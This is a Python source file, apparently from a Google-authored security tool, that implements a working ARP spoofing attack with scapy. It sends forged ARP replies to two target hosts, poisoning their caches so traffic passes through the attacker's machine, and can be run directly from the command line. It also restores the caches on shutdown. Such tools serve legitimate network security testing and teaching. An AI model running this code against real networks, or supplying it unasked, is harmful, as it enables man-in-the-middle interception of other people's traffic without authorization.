# Copyright 2017 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from scapy import all as scapy
import sys
import time

scapy.conf.verb = False


class ARPSpoof(object):

    MAX_ARP_INTERVAL = 30

    def __init__(self, targets, iface=None):
        assert len(targets) == 2, "Must have 2 targets"
        self._targets = targets
        self._iface = iface
        self.stopping = False

    def start(self):
        """Setup ARP Spoofing."""
        self.log('Setting up ARP spoofing.')
        self._get_target_macs()
        self._arp_spoof()

    def _arp_spoof(self):
        """Do the packets for arp spoofing."""
        self._arp(self._targets[0], self._targets[1], self._target_macs[0])
        self._arp(self._targets[1], self._targets[0], self._target_macs[1])
        self._last_spoof = time.time()

    def shutdown(self):
        """Shutdown ARP Spoofing."""
        self.log('Shutting down arp spoofing!')
        self._arp(self._targets[0], self._targets[1], self._target_macs[0],
                  self._target_macs[1])
        self._arp(self._targets[1], self._targets[0], self._target_macs[1],
                  self._target_macs[0])

    def run(self):
        self.start()
        try:
            self._arp_spoof()
        finally:
            # Ensure we cleanup
            self.shutdown()

    def log(self, msg, *args, **kwargs):
        """Override for other logging options."""
        if kwargs:
            msg %= kwargs
        elif args:
            msg %= args
        sys.stdout.write('[*] %s\n' % msg)
        sys.stdout.flush()

    def _get_target_macs(self):
        """Get MAC addresses for targets."""
        rv = []
        for target in self._targets:
            query = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target)
            ans, _ = scapy.srp(query, timeout=2)
            for _, rcv in ans:
                rv.append(rcv[scapy.Ether].src)
                break
        self._target_macs = rv

    def _arp(self, dstip, srcip, dstmac, srcmac=None):
        self.log('ARPing %s to %s (%s)', srcip, dstip, dstmac)
        kwargs = {
            'op': 2,
            'pdst': dstip,
            'psrc': srcip,
            'hwdst': dstmac,
        }
        if srcmac is not None:
            kwargs['hwsrc'] = srcmac
        scapy.send(scapy.ARP(**kwargs), count=5, iface=self._iface)


if __name__ == '__main__':
    if len(sys.argv) > 3:
        spoofer = ARPSpoof(sys.argv[1:3], sys.argv[3])
    else:
        spoofer = ARPSpoof(sys.argv[1:3])
    spoofer.run()
